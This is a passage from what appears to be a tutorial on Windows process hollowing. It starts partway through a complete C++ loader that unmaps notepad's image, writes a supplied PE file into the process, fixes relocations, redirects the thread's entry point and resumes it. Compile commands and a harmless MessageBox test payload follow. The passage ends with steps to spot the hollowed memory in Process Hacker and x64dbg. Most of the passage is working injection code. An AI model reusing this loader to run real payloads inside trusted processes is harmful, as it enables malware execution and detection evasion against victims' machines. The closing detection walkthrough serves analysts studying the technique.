    ReadProcessMemory(pi.hProcess,
        (PBYTE)ctx.Ebx + 0x8,
        &baseAddress, sizeof(PVOID), NULL);
#endif

    // Resolve NtUnmapViewOfSection at runtime from ntdll.
    // This removes the original notepad image from the process address space.
    auto NtUnmapViewOfSection =
        (_NtUnmapViewOfSectionFunc)GetProcAddress(
            GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");

    NtUnmapViewOfSection(pi.hProcess, baseAddress);

    // Open the payload PE file and read it into a local buffer
    HANDLE file = CreateFileA(argv[1], GENERIC_READ, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD size = GetFileSize(file, NULL);
    char* PEBytes = (char*)malloc(size);

    DWORD read;
    ReadFile(file, PEBytes, size, &read, NULL);
    CloseHandle(file);

    // Parse the DOS and NT headers to extract image metadata
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)PEBytes;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(PEBytes + dos->e_lfanew);

    // Allocate memory inside the target process at the same base address.
    // If ASLR places it elsewhere, baseOffset will be non-zero and
    // relocations will be needed.
    PVOID alloc = VirtualAllocEx(pi.hProcess, baseAddress,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Calculate the delta between where the PE expects to be loaded
    // and where it was actually allocated
#ifdef _WIN64
    DWORD64 baseOffset = (DWORD64)alloc - nt->OptionalHeader.ImageBase;
    nt->OptionalHeader.ImageBase = (DWORD64)alloc;
#else
    DWORD baseOffset = (DWORD)alloc - nt->OptionalHeader.ImageBase;
    nt->OptionalHeader.ImageBase = (DWORD)alloc;
#endif

    // Write the PE headers into the target process
    WriteProcessMemory(pi.hProcess, alloc, PEBytes,
        nt->OptionalHeader.SizeOfHeaders, NULL);

    // Write each section from the file into its correct virtual address
    PIMAGE_SECTION_HEADER sec =
        (PIMAGE_SECTION_HEADER)(PEBytes + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (PBYTE)alloc + sec[i].VirtualAddress,
            PEBytes + sec[i].PointerToRawData,
            sec[i].SizeOfRawData, NULL);
    }

    // Relocations are only needed when the image landed at a different base
    if (baseOffset) {

        // Find the raw file offset of the .reloc section
        DWORD relocAddress = 0;
        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (memcmp(sec[i].Name, ".reloc", 6) == 0) {
                relocAddress = sec[i].PointerToRawData;
                break;
            }
        }

        IMAGE_DATA_DIRECTORY relocData =
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        DWORD offset = 0;

        // Walk every relocation block in the .reloc section
        while (offset < relocData.Size) {

            // Each block header describes one 4KB page
            PRELOCATION_BLOCK block =
                (PRELOCATION_BLOCK)(PEBytes + relocAddress + offset);
            offset += sizeof(RELOCATION_BLOCK);

            // Entries follow immediately after the block header
            PRELOCATION_ENTRY entries =
                (PRELOCATION_ENTRY)(PEBytes + relocAddress + offset);

            DWORD count =
                (block->BlockSize - sizeof(RELOCATION_BLOCK)) /
                sizeof(RELOCATION_ENTRY);

            for (int i = 0; i < (int)count; i++) {

                // Type 0 is a padding entry — nothing to patch
                if (entries[i].Type == 0) continue;

                // Absolute address inside the target process that needs fixing
                DWORD field = block->PageAddress + entries[i].Offset;

#ifdef _WIN64
                // Read the original pointer, apply the base delta, write it back
                DWORD64 value = 0;
                ReadProcessMemory(pi.hProcess,
                    (PBYTE)alloc + field, &value, sizeof(PVOID), NULL);
                value += baseOffset;
                WriteProcessMemory(pi.hProcess,
                    (PBYTE)alloc + field, &value, sizeof(PVOID), NULL);
#else
                DWORD value = 0;
                ReadProcessMemory(pi.hProcess,
                    (PBYTE)alloc + field, &value, sizeof(PVOID), NULL);
                value += baseOffset;
                WriteProcessMemory(pi.hProcess,
                    (PBYTE)alloc + field, &value, sizeof(PVOID), NULL);
#endif
            }

            // Advance past all entries to the next block
            offset += count * sizeof(RELOCATION_ENTRY);
        }
    }

    // Update the PEB's ImageBase to reflect the new location,
    // then set the thread's entry point register to the payload's entry point
#ifdef _WIN64
    WriteProcessMemory(pi.hProcess,
        (PBYTE)ctx.Rdx + 0x10,
        &nt->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
    ctx.Rcx = (DWORD64)((PBYTE)alloc + nt->OptionalHeader.AddressOfEntryPoint);
#else
    WriteProcessMemory(pi.hProcess,
        (PBYTE)ctx.Ebx + 0x8,
        &nt->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
    ctx.Eax = (DWORD)((PBYTE)alloc + nt->OptionalHeader.AddressOfEntryPoint);
#endif

    // Apply the modified context and let the thread run
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    printf("[+] Hollowing complete\n");
    free(PEBytes);
    return 0;
}
```

```bash
x86_64-w64-mingw32-g++ ProcHoll.cpp -o ProcHoll.exe -static
```

Also create simple MessageBox for test:

```cpp
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                     LPSTR lpCmdLine, int nCmdShow) {
      MessageBoxA(NULL, "I am inside Notepad!", "Hollowed!", MB_OK);
      return 0;
}
```

```bash
x86_64-w64-mingw32-g++ msgbox.cpp -o msgbox.exe -mwindows -static
```

```bash
PS C:\Users\At0m\Downloads>  .\ProcHoll.exe .\msgbox.exe
[+] Hollowing complete
```

If we look from Process Hacker Memory tab we can see Private + RWX at the image base which is what no legitimate Windows process ever has, that's the definitive proof of hollowing.

![](/img/processhacker.png)

Add this section in end of `ProcHoll.cpp`:

```c
<SNIP>
  printf("[*] Press ENTER to resume...\n");
  getchar();
  ResumeThread(pi.hThread);
<SNIP>
```

Then attach the `notepad.exe` in x64dbg.

![](/img/x64dbg.png)

A real notepad.exe would have separate IMG entries for .text, .rdata, .data, .rsrc, .reloc etc. (just like ntdll.dll shows in our output with all its sections listed individually). Hollowed notepad has just one flat PRV blob, the entire injected PE dumped into a single allocation. Right click on it and Follow it in Disassembler:

![](/img/x64dbg2.png)

We can see `MZ` header just there search for string references and we can find our `Hollowed!` message box string.

![](/img/hollowed-msgbox.png)

---



